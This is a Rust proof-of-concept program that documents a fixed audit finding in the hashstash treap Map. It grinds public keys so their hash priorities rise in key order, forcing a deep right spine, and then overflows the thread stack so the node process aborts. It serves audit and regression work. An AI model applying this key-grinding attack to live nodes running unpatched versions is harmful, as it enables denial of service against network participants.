//! Proof of concept for finding H7: unbounded recursion in `hashstash::tree::Map`.
//!
//! Status: fixed (audit F007). Insert, remove, merge, split, drop and snapshot
//! restoration now walk paths with heap worklists, so this program is expected
//! to print "survived depth N" for any N; tests/treap_depth.rs keeps a smaller
//! spine on a 128 KiB stack as a regression test. The description below is the
//! original analysis. Ground depth still costs one node copy per level on each
//! update of that path; it no longer aborts the process. That linear cost is a
//! documented limit of the commitment (docs/NETWORK-HARDENING.md, "Remaining
//! limits").
//!
//! `Map` (src/tree.rs) is a treap whose node priority is
//! `tagged_hash("Hashstash/TreePriority", key)` (tree.rs:52). The binary-search
//! shape is therefore the unique Cartesian tree of `(priority, key)` pairs, and
//! `precedes` (tree.rs:89) orders nodes by `(priority, key)` lexicographically:
//! the node with the smallest pair is the root and smaller pairs sit closer to
//! it. Because the priority is a plain hash of the key, and account keys are
//! attacker-chosen 32-byte x-only public keys (state.rs:54 keys the accounts
//! `Map<Account>` by `key.to_vec()`), an attacker can grind keys whose
//! priorities are strictly increasing in the same order as the keys. Both the
//! key order and the priority order then agree, so the unique treap degenerates
//! into a right spine of depth N.
//!
//! `insert`, `merge` and `remove` (tree.rs:94 / 132 / 146) recurse once per
//! spine level with no depth bound, and the reference-counted nodes are freed by
//! a recursive `Drop` of the `Arc` chain. On a spine of depth N a single
//! insert/remove - or just dropping the map - recurses N frames deep. Once N
//! exceeds what the thread stack holds, the recursion hits the stack guard page
//! and the OS aborts the whole process. A stack overflow is NOT a catchable Rust
//! panic: it cannot be contained by the node's per-transaction error handling,
//! so a block that inserts enough adversarial accounts (or any later
//! insert/remove touching the spine) takes the node process down.
//!
//! Grinding cost: targeting one priority into each of N disjoint bands of the
//! hash space costs ~N hash tries per key, ~N^2 total; additionally requiring
//! each accepted key to be a valid x-only point (as audited accounts are -
//! state.rs:118 enforces `crypto::valid_key`) roughly doubles that to ~2*N^2.
//!
//! Run (do NOT point this at a real node - it is meant to crash this process):
//!
//!     cargo run --release --example poc_treap_depth -- [N] [STACK_BYTES] [VALID_POINTS]
//!
//! * N            number of spine keys to grind and insert (default 20000).
//! * STACK_BYTES  worker-thread stack size (default 2097152 = 2 MiB, the Tokio
//!                blocking-thread default; pass 1048576 for the 1 MiB default
//!                Windows main-thread stack).
//! * VALID_POINTS 1 (default) requires each key to be a valid x-only secp256k1
//!                point, matching the real accounts map; 0 runs the pure
//!                data-structure demonstration with arbitrary 32-byte keys.
//!
//! Output:
//! * The grind reports the number of `tagged_hash` calls and the elapsed time.
//! * The worker thread prints the spine depth every 1000 inserts and flushes, so
//!   the last line printed brackets the depth at which it dies.
//! * The process aborts with "thread '...' has overflowed its stack" (SIGABRT on
//!   unix, an EXCEPTION_STACK_OVERFLOW on Windows) => VULNERABLE at that depth.
//! * If it instead prints "survived depth N", raise N (or lower STACK_BYTES) and
//!   re-run until it aborts.

use hashstash::{crypto, tree::Map};
use std::io::Write;
use std::time::Instant;

/// Exact priority tag used by the treap (src/tree.rs:52).
const PRIORITY_TAG: &str = "Hashstash/TreePriority";

fn main() {
    let mut args = std::env::args().skip(1);
    let n: usize = args
        .next()
        .map_or(Ok(20_000), |s| s.parse())
        .expect("N must be a positive integer");
    let stack_bytes: usize = args
        .next()
        .map_or(Ok(2 * 1024 * 1024), |s| s.parse())
        .expect("STACK_BYTES must be a positive integer");
    let require_valid_points: bool = args
        .next()
        .map_or(Ok(1u8), |s| s.parse())
        .expect("VALID_POINTS must be 0 or 1")
        != 0;

    assert!(n >= 2, "need at least two keys to form a spine");
    // Each key must land in its own disjoint priority band; the bands collapse
    // (and grinding would never terminate) only for astronomically large N.
    assert!(
        (n as u128) < (1u128 << 60),
        "N is too large for distinct priority bands"
    );

    println!(
        "H7 PoC: grinding a depth-{n} treap spine (stack {stack_bytes} bytes, \
         valid_points={require_valid_points})"
    );

    // --- 1. Grind the spine -------------------------------------------------
    //
    // Keys are a fixed 24-byte zero prefix followed by a strictly increasing
    // 8-byte big-endian counter, so successive accepted keys are strictly
    // increasing in byte order. For the i-th key we keep hashing until its
    // priority's leading 8 bytes (the dominant term of the `(priority, key)`
    // comparison, since `Hash` is `[u8; 32]` ordered lexicographically) fall in
    // the i-th of N equal, disjoint bands of the u64 space. Disjoint ascending
    // bands make the priorities strictly increasing in the same order as the
    // keys, so every parent `precedes` its single right child and the unique
    // treap is a right spine of depth N.
    let mut keys: Vec<[u8; 32]> = Vec::with_capacity(n);
    let mut counter: u64 = 0;
    let mut hashes: u64 = 0;
    let started = Instant::now();
    for i in 0..n {
        let lo = ((i as u128) << 64) / n as u128;
        let hi = (((i as u128) + 1) << 64) / n as u128;
        loop {
            let mut key = [0u8; 32];
            key[24..32].copy_from_slice(&counter.to_be_bytes());
            counter += 1;
            let priority = crypto::tagged_hash(PRIORITY_TAG, &key[..]);
            hashes += 1;
            let lead = u64::from_be_bytes(priority[..8].try_into().unwrap()) as u128;
            if lead >= lo && lead < hi {
                if require_valid_points && !crypto::valid_key(&key) {
                    continue; // re-grind this band until the key is also a point
                }
                keys.push(key);
                break;
            }
        }
    }
    let elapsed = started.elapsed();
    println!(
        "grind: {n} keys, {hashes} tagged_hash calls, {:.2}s ({:.1} hashes/key)",
        elapsed.as_secs_f64(),
        hashes as f64 / n as f64
    );

    // Confirm the ladder: both keys and priorities strictly ascending. This is
    // exactly the condition under which the unique Cartesian tree is a right
    // spine, so the resulting tree depth equals N.
    for w in keys.windows(2) {
        assert!(w[0] < w[1], "keys must be strictly increasing");
        let p0 = crypto::tagged_hash(PRIORITY_TAG, &w[0][..]);
        let p1 = crypto::tagged_hash(PRIORITY_TAG, &w[1][..]);
        assert!(p0 < p1, "priorities must be strictly increasing");
    }
    println!("verified {n} keys form a strictly ascending (key, priority) ladder => spine depth {n}");

    // --- 2 & 3. Insert on a thread with a bounded stack ---------------------
    //
    // Inserting in ascending key order makes insert #i recurse i levels down the
    // right spine, so the stack grows by one frame per key. The treap shape is
    // insertion-order independent (tree.rs module docs: "insertion order ...
    // cannot change the root"), so a real node reaches the same depth-N spine no
    // matter what order the accounts are created in; ascending order simply
    // makes each individual insert here maximally deep.
    let handle = std::thread::Builder::new()
        .name("treap-depth".into())
        .stack_size(stack_bytes)
        .spawn(move || {
            let mut map: Map<u64> = Map::new();
            for (i, key) in keys.iter().enumerate() {
                map.insert(key.to_vec(), i as u64); // recurses i levels deep
                let depth = i + 1;
                if depth % 1000 == 0 {
                    println!("  inserted {depth} keys; right-spine depth {depth}");
                    let _ = std::io::stdout().flush();
                }
            }
            // Only reached if N was too small to overflow during the build.
            // Exercise the deepest remove/insert path once more explicitly: both
            // recurse all the way down the N-deep spine.
            let deepest = map.last().map(|(k, _)| k.to_vec()).unwrap();
            let value = map.remove(&deepest).unwrap(); // recurses depth N
            map.insert(deepest, value); // recurses depth N
            println!("survived depth {}", map.len());
            let _ = std::io::stdout().flush();
            // Dropping `map` here frees the Arc spine with a recursive Drop -
            // another depth-N recursion on this same bounded stack.
        })
        .expect("failed to spawn worker thread");

    // If the worker overflows its stack the whole process aborts and join never
    // returns; reaching here means the spine was shallow enough to survive.
    match handle.join() {
        Ok(()) => println!("worker thread completed without overflow"),
        Err(_) => println!("worker thread panicked (not a stack overflow)"),
    }
}
